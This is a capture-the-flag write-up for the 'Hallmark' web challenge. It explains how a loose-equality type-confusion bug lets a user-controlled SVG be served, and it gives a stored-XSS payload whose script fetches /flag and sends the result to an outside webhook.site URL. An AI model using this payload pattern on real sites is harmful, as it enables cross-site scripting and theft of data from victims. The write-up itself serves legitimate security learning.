# Hallmark
Category: web
Requires: xss, javascript knowledge (and some svg knowledge ig)

(wasn't solved during event, this is just my proecdure after reading a few writeups)

Looking through the source code of the server, it does not seem that we are able to directly xss it from just the `POST /flag` 
However there is the `PUT /flag` route for the challenge that allows us to potentially edit a card's content:
```js
app.put('/card', (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]) {
        res.send('bad id');
        return;
    }

    cards[id].type = type == 'image/svg+xml' ? type : 'text/plain';
    cards[id].content = type === 'image/svg+xml' ? IMAGES[svg || 'heart'] : content;

    res.send('ok');

});
```
We also see that we can pass rich objects and arrays into the request since `extended: true`:
```js
app.use(bodyParser.urlencoded({ extended: true }));
```
We want the type to be `image/svg+xml` so that it renders as an svg allowing it to run the `<script></script>` in the svg, but we want to input our own svg. We simply set the `type` to be `["image/svg+xml"]` since:
```js
> ['a'] == 'a'
True
> ['a'] === 'a'
False
```
so we first create a pre-existing card, then we send the following request on https://hoppscotch.io:
Request Body:
| Parameter | Value                                                                                                                                                                                                                              |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `id`        | `[your id]`                                                                                                                                                                                                                          |
| `type[]`  | `image/svg+xml` - inputs an array into the server                                                                                                                                                                                                                  |
| `content`   | `<svg version="1.1" width="300" height="200" xmlns="http://www.w3.org/2000/svg"><script>fetch('/flag').then(r=>r.text()).then(d=>window.location="https://webhook.site/63b5be4d-5111-467d-8572-18702c2e7b00?c="+d)</script></svg>` |

its simply an svg:
```xml
<svg version="1.1" width="300" height="200" xmlns="http://www.w3.org/2000/svg"><script></script></svg>
```
with a fetch
```js
fetch('/flag').then(r=>r.text()).then(d=>window.location="https://webhook.site/blahblah?c="+d)
```
now we submit this to the admin site and in our webhook we see:
`actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}`
